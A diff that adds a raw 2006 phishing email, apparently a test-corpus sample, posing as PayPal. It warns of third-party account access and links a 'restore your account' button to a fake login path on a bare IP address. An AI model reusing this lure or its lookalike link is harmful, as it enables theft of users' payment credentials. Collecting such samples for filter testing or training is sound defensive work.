@@ -1,0 +1,143 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id EA4222A898
+ for <user@example.com>; Sun, 22 Jan 2006 10:11:37 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id DE15F621C9C; Sun, 22 Jan 2006 10:11:37 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 857A2621C95
+ for <user@example.com>; Sun, 22 Jan 2006 10:11:37 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id KAA19347
+ for user@example.com; Sun, 22 Jan 2006 10:11:36 -0500
+Received: from STAR1.kayka.org (67-14-171-144.colodns.com [67.14.171.144] (may
+ be forged)) by mail.example.com with ESMTP id KAA19339
+ for <user@example.com>; Sun, 22 Jan 2006 10:11:36 -0500
+Message-Id: <200601221511.KAA19339@mail.example.com>
+Received: from ([127.0.0.1]) with MailEnable ESMTP;
+ Sat, 21 Jan 2006 18:29:52 -0600
+From: "PayPal Inc." <service@paypal.com>
+Subject: Please Restore Your Account Access
+Date: Sat, 21 Jan 2006 16:29:55 -0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 278
+
+
+
+<body>
+
+<table cellSpacing="0" cellPadding="0" width="600" align="center" border="0">
+  <tbody>
+    <tr vAlign="top">
+      <td><a href="https://www.paypal.com/us" target="_blank"><img alt="PayPal" src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border="0" width="200" height="50"></a></td>
+    </tr>
+  </tbody>
+</table>
+<table cellSpacing="0" cellPadding="0" width="100%" align="center" border="0">
+  <tbody>
+    <tr>
+      <td width="100%" background="http://images.paypal.com/en_US/i/scr/bg_clk.gif"><img height="29" alt="src=http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" border="0" ?></td>
+    </tr>
+    <tr>
+      <td><img height="10" alt="src=http://images.paypal.com/en_US/i/scr/pixel.gif" width="1" border="0" ?></td>
+    </tr>
+  </tbody>
+</table>
+<table cellSpacing="0" cellPadding="0" width="512" align="center" border="0">
+  <tbody>
+    <tr>
+      <td width="510">
+        <table height="312" width="671">
+          <tbody>
+            <tr vAlign="top">
+              <td width="663" height="1">
+                <table cellSpacing="0" cellPadding="0" width="100%" border="0">
+                  <tbody>
+                    <tr>
+                      <td class="pp_heading" align="left"><font face="Arial" size="2">Dear
+                        member,</font></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </td>
+            </tr>
+            <tr>
+              <td width="663" height="333"><font face="Arial" size="2">As part
+                of our security measures, we regularly screen activity in the
+                PayPal system. We recently contacted you after noticing an issue
+                on your account. We requested information from you for the
+                following reason:</font>
+                <p><font face="Arial" size="2">We have reason to believe that
+                your account was accessed by a third party. Because protecting
+                the security of your account is our primary concern, we have
+                limited access to sensitive PayPal account features. We
+                understand that this may be an inconvenience but please
+                understand that this temporary limitation is for your
+                protection. Please fallow the link below to restore your account
+                access.</font></p>
+                <p align="left"><font face="Arial" size="2">Case ID Number:
+                PP-098-556-456<br>
+                </font></p>
+                <table cellSpacing="0" cellPadding="1" width="241" align="left" bgColor="#ffe65c" border="0">
+                  <tbody>
+                    <tr>
+                      <td width="386">
+                        <table cellSpacing="0" cellPadding="4" width="302" align="center" bgColor="#fffecd" border="0">
+                          <tbody>
+                            <tr>
+                              <td class="pp_sansserif" align="middle" width="294">
+                                <p align="center"><b><font size="2"><a href="http://202.143.134.147:81/secure/paypal.com/us/my-account-234dsgbdsgljksdghjkrjkrt688sdfhdsgoisdgyds8dh6a3t43yhdll/login-account-adgrg35336hdhsecure73356login46364332-my-account-324235/webscr/cmd=login-run/index.htm" target="_blank" >Click
+                                here to restore your PayPal account.</a></font></b></p>
+                              </td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <p><br>
+                <br>
+                <font face="Arial"><font size="2"><br>
+                <br>
+                </font><XBODY>
+                <font size="2">Thank you for your patience as we work together
+                to protect your account.</font></font></p>
+                <table width="100%" border="0">
+                  <tbody>
+                    <tr>
+                      <td width="100%"><font face="Arial"><font size="2">PayPal
+                        Account Review Department</font></XBODY>
+                        </font></td>
+                    </tr>
+                    <tr>
+                      <td width="100%"><span class="xptFooter"><font size="2">PayPal
+                        Email ID PP1201</font></span></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+</body>
+
+</html>
